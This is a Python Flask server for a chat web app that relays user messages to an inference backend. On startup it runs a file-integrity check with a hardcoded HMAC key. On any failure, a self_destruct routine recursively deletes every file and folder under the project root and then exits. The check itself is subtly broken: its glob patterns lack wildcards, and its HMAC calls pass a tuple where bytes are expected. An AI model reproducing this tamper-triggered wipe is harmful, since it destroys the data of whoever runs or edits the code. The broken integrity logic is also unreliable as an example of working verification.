from flask import Flask, request, jsonify, send_from_directory, abort
import os
import hmac
import hashlib
import glob
import shutil
import time
import json

APP_ROOT=os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT=os.path.abspath(os.path.join(APP_ROOT, ".."))
STATIC_DIR=os.path.join(PROJECT_ROOT,"frontend","static")
TEMPLATE_DIR=os.path.join(PROJECT_ROOT,"frontend")
INFERENCE_URL=os.environ.get("INFERENCE_BACKEND_URL","").strip()
FINGERPRINT_KEY_PART_ENV=os.environ.get("FP_KEY_PART","").encode("utf8")

def key_parts():
    a=b"\x9f\x13\xaa\x71\x02\xf1\x6b\xcd\x44\x10\x98\x3c\x5d\x21\x7e\x4b\x2a\xac\x10\xe1\xbb\x56\x88\x41\x02\x10\x77\xb4\x9d\x0f\x18\x91"
    b_part=FINGERPRINT_KEY_PART_ENV
    c_seed="iospwafpseed"
    c=hmac.new(a,c_seed.encode("utf8"),hashlib.sha256).digest()
    return a,b_part,c

def read_file(p):
    with open(p,"rb") as f:
        return f.read()

def write_file(p,data):
    with open(p,"wb") as f:
        f.write(data)

def extract_signature(blob):
    marker=b"\n__FP_BLOCK_BEGIN__\n"
    if marker not in blob:
        return blob,None
    head,tail=blob.split(marker,1)
    return head,tail

def compute_hmac(content,parts):
    h=hmac.new(parts,content,hashlib.sha256)
    h.update(parts[1])
    h.update(parts)
    return h.hexdigest()

def verify_all():
    parts=key_parts()
    targets=[]
    targets+=glob.glob(os.path.join(PROJECT_ROOT,"backend",".py"))
    targets+=glob.glob(os.path.join(PROJECT_ROOT,"frontend",".html"))
    targets+=glob.glob(os.path.join(PROJECT_ROOT,"frontend","static",".css"))
    targets+=glob.glob(os.path.join(PROJECT_ROOT,"frontend","static",".js"))
    for p in targets:
        data=read_file(p)
        body,tail=extract_signature(data)
        if tail is None:
            self_destruct("missing signature in "+p)
        try:
            meta=json.loads(tail.decode("utf8"))
        except:
            self_destruct("invalid signature json in "+p)
        expected=compute_hmac(body,parts)
        if meta.get("hmac","")!=expected or meta.get("path","")!=os.path.relpath(p,PROJECT_ROOT):
            self_destruct("integrity fail "+p)

def self_destruct(reason):
    try:
        flag=os.path.join(PROJECT_ROOT,"SELF_DESTRUCT_"+str(int(time.time())))
        write_file(flag,reason.encode("utf8"))
        for root,dirs,files in os.walk(PROJECT_ROOT,topdown=False):
            for name in files:
                p=os.path.join(root,name)
                try:
                    if os.path.basename(p).startswith("SELF_DESTRUCT_"):
                        continue
                    os.remove(p)
                except:
                    pass
            for name in dirs:
                p=os.path.join(root,name)
                try:
                    shutil.rmtree(p,ignore_errors=True)
                except:
                    pass
    finally:
        os._exit(1)

verify_all()
app=Flask(__name__,static_folder=STATIC_DIR,template_folder=TEMPLATE_DIR)

@app.route("/api/chat",methods=["POST"])
def chat():
    if not INFERENCE_URL:
        return jsonify({"error":"inference backend unavailable"}),503
    try:
        payload=request.get_json(force=True)
    except:
        return jsonify({"error":"invalid json"}),400
    msg=str(payload.get("message","")).strip()
    if not msg:
        return jsonify({"error":"empty message"}),400
    import requests
    try:
        r=requests.post(INFERENCE_URL,json={"message":msg,"mode":"flowerneumeta"},timeout=30)
    except:
        return jsonify({"error":"backend unreachable"}),502
    if r.status_code!=200:
        return jsonify({"error":"backend error"}),502
    data=r.json()
    txt=str(data.get("text","")).strip()
    if not txt:
        return jsonify({"error":"invalid backend payload"}),502
    return jsonify({"response":txt,"model":"JAIDE 12.5","flower_ai_active":True,"neumeta_active":True,"timestamp":int(time.time())})

@app.route("/",methods=["GET"])
def index():
    return send_from_directory(TEMPLATE_DIR,"index.html")

@app.route("/<path:path>",methods=["GET"])
def static_files(path):
    try:
        if path=="index.html":
            return send_from_directory(TEMPLATE_DIR,"index.html")
        if path.startswith("static/"):
            return send_from_directory(TEMPLATE_DIR,path.replace("static/","static/"))
        return send_from_directory(TEMPLATE_DIR,path)
    except:
        abort(404)

if __name__=="__main__":
    port=int(os.environ.get("PORT","5000"))
    app.run(host="0.0.0.0",port=port)

